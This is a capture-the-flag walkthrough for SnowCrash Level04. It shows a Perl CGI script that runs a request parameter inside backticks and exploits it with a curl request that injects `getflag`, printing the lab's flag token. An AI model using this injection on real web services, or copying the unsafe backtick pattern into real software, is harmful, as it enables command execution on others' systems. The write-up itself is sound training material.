```markdown
# SnowCrash – Level04 Walkthrough

## 🧠 Objective

Find a way to exploit the `level04.pl` Perl script to retrieve the flag.

---

## 📜 The Script

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

This script:
1. Uses the `CGI` module to fetch the `x` parameter from a web request.
2. Executes `echo $x` using backticks, allowing potential command injection.

---

## ❌ Initial Observation – Why Direct Exploitation Fails

Trying to pass a payload through the terminal like this:

```bash
./level04.pl "x=\`getflag\`"
```

**fails to return the flag**, even though the command is clearly injected.

### ✅ Why?
The `getflag` binary only returns the flag **when executed by the effective UID of level04**, which happens **only when the script is executed by the web server** — not manually from the terminal.

---

## 🔍 Step-by-Step Exploitation

### 1. 🛠 Check if the web server is running

```bash
netstat -tulnp | grep 4747
```

Expected output:
```
tcp        0      0 127.0.0.1:4747          0.0.0.0:*               LISTEN
```

This confirms the server is listening locally on port 4747.

---

### 2. 🌐 Exploit via HTTP using `curl`

Now that we know the script is triggered through a web server, we can inject a command via a GET request:

```bash
curl "http://localhost:4747/?x=\`getflag\`"
```

### ✅ Output:

```
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

---

## 🎯 Conclusion

- Command injection is possible due to unsafe use of backticks in Perl.
- The vulnerability is only exploitable through the web server (not from terminal).
- By injecting a call to `getflag` via HTTP, the script returns the correct token.
